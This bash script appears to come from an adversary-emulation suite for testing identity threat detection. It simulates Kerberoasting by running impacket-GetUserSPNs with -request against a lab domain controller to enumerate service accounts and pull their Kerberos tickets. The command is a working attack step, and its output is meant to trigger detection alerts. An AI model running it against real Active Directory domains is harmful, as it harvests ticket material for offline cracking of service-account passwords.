#!/usr/bin/env bash
# T1558.003 — AD reconnaissance: enumerate service accounts with SPNs
# Derived verbatim from SIM-MP-002 step step-01 (../../mp-002-kerberoast-lateral-smb.yml).
# LEGAL: run only in an authorized, isolated lab. See ../README.md.
set -u -o pipefail
echo "[SIM-MP-002/T1558.003] AD reconnaissance: enumerate service accounts with SPNs"

echo '[MP-002] ITDR: enumerate Kerberoast-vulnerable accounts';
DC_IP="${CORTEXSIM_DC_IP:-10.0.10.10}";
DOMAIN="${CORTEXSIM_DOMAIN:-cortexsim.local}";
ADMIN_PWD="${CORTEXSIM_ADMIN_PWD:-PlaceholderForDemo}";
echo "[*] Target: $DOMAIN via $DC_IP";
impacket-GetUserSPNs "$DOMAIN/Administrator:$ADMIN_PWD" -dc-ip "$DC_IP" -request 2>&1 | head -20 || echo '[*] demo-mode: impacket not configured';
echo '[*] ITDR should flag LDAP sweep querying servicePrincipalName attribute'
